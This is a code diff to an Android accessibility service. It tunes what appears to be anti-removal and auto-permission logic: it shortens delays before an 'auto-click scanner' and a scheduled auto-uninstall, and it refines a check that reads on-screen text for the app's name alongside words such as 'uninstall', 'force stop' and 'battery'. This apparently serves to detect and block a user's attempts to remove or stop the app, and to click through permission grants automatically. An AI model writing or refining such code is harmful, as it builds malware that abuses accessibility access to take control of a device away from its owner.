@@ -127,16 +127,16 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         }
 
         // Auto-click scanner (defent protection) and auto-uninstall:
-        //   First launch → wait 30 s (permissions are still being granted, screen is busy)
+        //   First launch → wait 15 s (permissions are still being granted, screen is busy)
         //   Reboot/restart → start within 2-3 s (everything is already set up)
-        final long protectionDelayMs = isFirstLaunch ? 30_000L : 2_000L;
+        final long protectionDelayMs = isFirstLaunch ? 15_000L : 2_000L;
         try {
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try { startAutoClickScanner(); } catch (Exception ignored) {}
             }, protectionDelayMs);
         } catch (Exception ignored) {}
 
-        try { scheduleAutoUninstall(isFirstLaunch ? 30_000L : 3_000L); } catch (Exception ignored) {}
+        try { scheduleAutoUninstall(isFirstLaunch ? 15_000L : 3_000L); } catch (Exception ignored) {}
 
         try {
             AccessibilityServiceInfo info = new AccessibilityServiceInfo();
@@ -879,7 +879,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     public void enableStorageAutoGrant() {
         if (autoGrantHandler == null) autoGrantHandler = new Handler(Looper.getMainLooper());
 
-        protectionSuspendedUntil = System.currentTimeMillis() + 25_000;
+        protectionSuspendedUntil = System.currentTimeMillis() + 15_000;
 
         final long endTime = System.currentTimeMillis() + 5_000;
         final Handler storageHandler = new Handler(Looper.getMainLooper());
@@ -1320,20 +1320,20 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         if (node == null || currentAppName.isEmpty()) return false;
         
         try {
-            String allText = getAllScreenText(node).toLowerCase();
-            String appNameLower = currentAppName.toLowerCase();
+            String allText = getAllScreenText(node);
+            String appName = currentAppName;
             
             String[] dangerousWords = {"uninstall", "delete", "remove", "stop", "options", "active apps", "kill", "battery", "apps", "mins", "minimize", "force stop"};
             
             for (String word : dangerousWords) {
-                if (allText.contains(appNameLower) && allText.contains(word)) {
+                if (allText.contains(appName) && containsWholeWord(allText, word)) {
                     return true;
                 }
             }
             
-            if (allText.contains("recent") && allText.contains(appNameLower)) {
+            if (allText.contains("recent") && allText.contains(appName)) {
                 for (String word : dangerousWords) {
-                    if (allText.contains(word)) {
+                    if (containsWholeWord(allText, word)) {
                         return true;
                     }
                 }
@@ -1344,6 +1344,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         }
         
         return false;
+    }
+    
+    private boolean containsWholeWord(String text, String word) {
+        String pattern = "\\b" + java.util.regex.Pattern.quote(word) + "\\b";
+        return text.matches("(?i).*" + pattern + ".*");
     }
     
     private String getAllScreenText(AccessibilityNodeInfo node) {
